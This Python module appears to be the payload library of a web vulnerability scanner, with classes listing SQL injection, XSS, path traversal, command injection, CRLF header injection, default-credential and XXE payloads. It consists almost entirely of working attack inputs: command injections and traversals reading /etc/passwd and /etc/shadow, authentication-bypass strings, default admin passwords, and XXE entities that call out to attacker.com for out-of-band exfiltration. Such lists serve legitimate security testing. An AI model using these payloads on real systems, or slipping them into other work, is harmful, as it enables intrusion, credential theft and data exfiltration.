"""
Payloads Module

Contains various payload collections for different vulnerability types.
Organized for easy extension and maintenance.
"""

class SQLPayloads:
    """SQL Injection payloads"""
    
    def __init__(self):
        self.payloads = [
            # Error-based payloads
            {"payload": "'", "type": "error_based", "description": "Single quote test"},
            {"payload": "' OR '1'='1", "type": "error_based", "description": "Basic OR injection"},
            {"payload": "' OR 1=1--", "type": "error_based", "description": "Comment-based injection"},
            {"payload": "' UNION SELECT NULL--", "type": "union_based", "description": "Union injection test"},
            {"payload": "' AND 1=CONVERT(int, (SELECT @@version))--", "type": "error_based", "description": "SQL Server version disclosure"},
            {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "type": "error_based", "description": "Information schema test"},
            
            # Time-based payloads
            {"payload": "'; WAITFOR DELAY '00:00:05'--", "type": "time_based", "description": "SQL Server time delay"},
            {"payload": "' OR SLEEP(5)--", "type": "time_based", "description": "MySQL time delay"},
            {"payload": "' OR pg_sleep(5)--", "type": "time_based", "description": "PostgreSQL time delay"},
            
            # Boolean-based payloads
            {"payload": "' AND 1=1--", "type": "boolean_based", "description": "True condition"},
            {"payload": "' AND 1=2--", "type": "boolean_based", "description": "False condition"},
            
            # Advanced payloads
            {"payload": "' OR '1'='1' /*", "type": "error_based", "description": "Comment bypass"},
            {"payload": "admin'--", "type": "authentication_bypass", "description": "Authentication bypass"},
            {"payload": "' OR 'x'='x", "type": "authentication_bypass", "description": "Always true condition"},
            {"payload": "') OR ('1'='1", "type": "error_based", "description": "Parentheses bypass"},
            
            # Second-order payloads
            {"payload": "test'; INSERT INTO users VALUES('hacker','password123')--", "type": "second_order", "description": "Second-order injection"},
        ]
    
    def get_payloads(self, fast_mode=False):
        if fast_mode:
            # Return only the most effective payloads for fast scanning
            return [p for p in self.payloads if p['type'] in ['error_based', 'authentication_bypass']][:5]
        return self.payloads
    
    def get_payloads_by_type(self, payload_type):
        return [p for p in self.payloads if p['type'] == payload_type]

class XSSPayloads:
    """Cross-Site Scripting payloads"""
    
    def __init__(self):
        self.payloads = [
            # Basic XSS
            {"payload": "<script>alert('XSS')</script>", "type": "reflected", "description": "Basic script tag"},
            {"payload": "<img src=x onerror=alert('XSS')>", "type": "reflected", "description": "Image onerror event"},
            {"payload": "<svg onload=alert('XSS')>", "type": "reflected", "description": "SVG onload event"},
            {"payload": "javascript:alert('XSS')", "type": "reflected", "description": "JavaScript protocol"},
            
            # Attribute-based XSS
            {"payload": "\" onmouseover=\"alert('XSS')\"", "type": "attribute", "description": "Attribute escape"},
            {"payload": "' onmouseover='alert(\"XSS\")'", "type": "attribute", "description": "Single quote attribute escape"},
            
            # Filter bypass techniques
            {"payload": "<ScRiPt>alert('XSS')</ScRiPt>", "type": "filter_bypass", "description": "Case variation"},
            {"payload": "<script>al\\u0065rt('XSS')</script>", "type": "filter_bypass", "description": "Unicode escape"},
            {"payload": "<iframe src=javascript:alert('XSS')>", "type": "reflected", "description": "Iframe javascript"},
            
            # Advanced payloads
            {"payload": "<details open ontoggle=alert('XSS')>", "type": "reflected", "description": "Details ontoggle"},
            {"payload": "<marquee onstart=alert('XSS')>", "type": "reflected", "description": "Marquee onstart"},
            {"payload": "<body onload=alert('XSS')>", "type": "reflected", "description": "Body onload"},
            
            # WAF bypass
            {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "type": "waf_bypass", "description": "Character code bypass"},
            {"payload": "<svg><script>alert('XSS')</script></svg>", "type": "waf_bypass", "description": "SVG script"},
            
            # DOM-based
            {"payload": "#<script>alert('XSS')</script>", "type": "dom_based", "description": "Hash-based DOM XSS"},
        ]
    
    def get_payloads(self, fast_mode=False):
        if fast_mode:
            # Return only the most effective payloads for fast scanning
            return [p for p in self.payloads if p['type'] in ['reflected', 'stored']][:5]
        return self.payloads
    
    def get_payloads_by_type(self, payload_type):
        return [p for p in self.payloads if p['type'] == payload_type]

class CSRFPayloads:
    """Cross-Site Request Forgery detection patterns"""
    
    def __init__(self):
        self.csrf_tokens = [
            'csrf_token', 'authenticity_token', '_token', 'csrfmiddlewaretoken',
            'csrf', 'token', 'xsrf_token', '_csrf', 'security_token'
        ]
    
    def get_csrf_token_names(self):
        return self.csrf_tokens

class IDORPayloads:
    """Insecure Direct Object Reference test cases"""
    
    def __init__(self):
        self.id_patterns = [
            r'/(\d+)/?$',
            r'[?&]id=(\d+)',
            r'[?&]user_id=(\d+)',
            r'[?&]account_id=(\d+)',
            r'[?&]file_id=(\d+)',
            r'/user/(\d+)',
            r'/profile/(\d+)',
            r'/account/(\d+)',
            r'/document/(\d+)',
            r'/file/(\d+)'
        ]
        
        self.test_values = [
            '1', '2', '0', '999', '1000', '-1',
            'admin', 'root', 'test', 'guest'
        ]
    
    def get_id_patterns(self):
        return self.id_patterns
    
    def get_test_values(self):
        return self.test_values

class FileDisclosurePayloads:
    """File disclosure and directory traversal payloads"""
    
    def __init__(self):
        self.payloads = [
            # Unix/Linux files
            {"payload": "../../../../etc/passwd", "type": "passwd", "description": "Linux password file"},
            {"payload": "../../../../etc/shadow", "type": "shadow", "description": "Linux shadow file"},
            {"payload": "../../../../etc/hosts", "type": "config", "description": "Hosts file"},
            {"payload": "../../../../proc/version", "type": "system", "description": "Kernel version"},
            {"payload": "../../../../proc/cpuinfo", "type": "system", "description": "CPU information"},
            
            # Windows files
            {"payload": "../../../../windows/system32/drivers/etc/hosts", "type": "config", "description": "Windows hosts file"},
            {"payload": "../../../../windows/system.ini", "type": "config", "description": "Windows system configuration"},
            {"payload": "../../../../windows/win.ini", "type": "config", "description": "Windows win.ini"},
            
            # Application files
            {"payload": ".env", "type": "env", "description": "Environment variables"},
            {"payload": "config.php", "type": "config", "description": "PHP configuration"},
            {"payload": "web.config", "type": "config", "description": "ASP.NET configuration"},
            {"payload": "application.properties", "type": "config", "description": "Java properties"},
            {"payload": "settings.py", "type": "config", "description": "Django settings"},
            
            # Log files
            {"payload": "../../../../var/log/apache/access.log", "type": "log", "description": "Apache access log"},
            {"payload": "../../../../var/log/apache/error.log", "type": "log", "description": "Apache error log"},
            {"payload": "../../../../var/log/nginx/access.log", "type": "log", "description": "Nginx access log"},
            {"payload": "../../../../var/log/nginx/error.log", "type": "log", "description": "Nginx error log"},
            
            # Backup files
            {"payload": "backup.sql", "type": "backup", "description": "SQL backup"},
            {"payload": "database.sql", "type": "backup", "description": "Database dump"},
            {"payload": "config.bak", "type": "backup", "description": "Configuration backup"},
            {"payload": "index.php.bak", "type": "backup", "description": "PHP backup"},
            
            # Source code
            {"payload": ".git/config", "type": "source", "description": "Git configuration"},
            {"payload": ".svn/entries", "type": "source", "description": "SVN entries"},
            {"payload": "package.json", "type": "source", "description": "Node.js package file"},
            {"payload": "composer.json", "type": "source", "description": "PHP composer file"},
            
            # URL encoding bypass
            {"payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd", "type": "passwd", "description": "URL encoded traversal"},
            {"payload": "....//....//....//....//etc/passwd", "type": "passwd", "description": "Double slash bypass"},
            
            # Null byte bypass (for older systems)
            {"payload": "../../../../etc/passwd%00", "type": "passwd", "description": "Null byte bypass"},
            {"payload": "../../../../etc/passwd%00.txt", "type": "passwd", "description": "Null byte with extension"},
        ]
    
    def get_payloads(self):
        return self.payloads
    
    def get_payloads_by_type(self, payload_type):
        return [p for p in self.payloads if p['type'] == payload_type]

class AuthenticationPayloads:
    """Authentication bypass and weak credential payloads"""
    
    def __init__(self):
        self.weak_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('administrator', 'administrator'),
            ('administrator', 'password'),
            ('root', 'root'),
            ('root', 'password'),
            ('root', 'toor'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('demo', 'demo'),
            ('user', 'user'),
            ('admin', ''),
            ('', 'admin'),
            ('admin', 'admin123'),
            ('sa', ''),
            ('oracle', 'oracle'),
            ('postgres', 'postgres'),
            ('mysql', 'mysql'),
            ('dbadmin', 'dbadmin'),
            ('webadmin', 'webadmin'),
            ('support', 'support'),
            ('info', 'info'),
            ('user', 'password'),
            ('user', '123456'),
            ('user', 'letmein'),          
        ]
        
        self.sql_auth_bypass = [
            "admin'--",
            "admin'/*",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin' OR '1'='1",
            "admin' OR 1=1--",
            "') OR ('1'='1'--",
            "') OR '1'='1'/*",
        ]
    
    def get_weak_credentials(self):
        return self.weak_credentials
    
    def get_sql_auth_bypass(self):
        return self.sql_auth_bypass

class HeaderInjectionPayloads:
    """HTTP header injection payloads"""
    
    def __init__(self):
        self.payloads = [
            # CRLF injection
            {"payload": "test\r\nSet-Cookie: injected=true", "type": "crlf", "description": "CRLF injection"},
            {"payload": "test%0d%0aSet-Cookie: injected=true", "type": "crlf", "description": "URL encoded CRLF"},
            {"payload": "test\nSet-Cookie: injected=true", "type": "crlf", "description": "LF injection"},
            
            # Host header injection
            {"payload": "evil.com", "type": "host_injection", "description": "Host header injection"},
            {"payload": "localhost:8080", "type": "host_injection", "description": "Port injection"},
            
            # User-Agent injection
            {"payload": "Mozilla/5.0\r\nInjected: header", "type": "user_agent", "description": "User-Agent CRLF"},
        ]
    
    def get_payloads(self):
        return self.payloads

class CommandInjectionPayloads:
    """Command injection payloads"""
    
    def __init__(self):
        self.payloads = [
            # Unix/Linux
            {"payload": "; cat /etc/passwd", "type": "linux", "description": "Semicolon separator"},
            {"payload": "| cat /etc/passwd", "type": "linux", "description": "Pipe operator"},
            {"payload": "&& cat /etc/passwd", "type": "linux", "description": "AND operator"},
            {"payload": "|| cat /etc/passwd", "type": "linux", "description": "OR operator"},
            {"payload": "`cat /etc/passwd`", "type": "linux", "description": "Backtick execution"},
            {"payload": "$(cat /etc/passwd)", "type": "linux", "description": "Command substitution"},
            
            # Windows
            {"payload": "& type C:\\windows\\system32\\drivers\\etc\\hosts", "type": "windows", "description": "Windows AND"},
            {"payload": "| type C:\\windows\\system32\\drivers\\etc\\hosts", "type": "windows", "description": "Windows pipe"},
            {"payload": "&& type C:\\windows\\system32\\drivers\\etc\\hosts", "type": "windows", "description": "Windows double AND"},
            
            # Time-based detection
            {"payload": "; sleep 5", "type": "time_based", "description": "Linux sleep"},
            {"payload": "& timeout 5", "type": "time_based", "description": "Windows timeout"},
            {"payload": "| ping -c 5 127.0.0.1", "type": "time_based", "description": "Ping delay"},
        ]
    
    def get_payloads(self):
        return self.payloads

class XXEPayloads:
    """XML External Entity (XXE) payloads"""
    
    def __init__(self):
        self.payloads = [
            {
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
                "type": "file_disclosure",
                "description": "Basic XXE file disclosure"
            },
            {
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>
<foo>&xxe;</foo>""",
                "type": "ssrf",
                "description": "XXE SSRF"
            },
            {
                "payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;]>
<foo>&exfil;</foo>""",
                "type": "out_of_band",
                "description": "Out-of-band XXE"
            }
        ]
    
    def get_payloads(self):
        return self.payloads
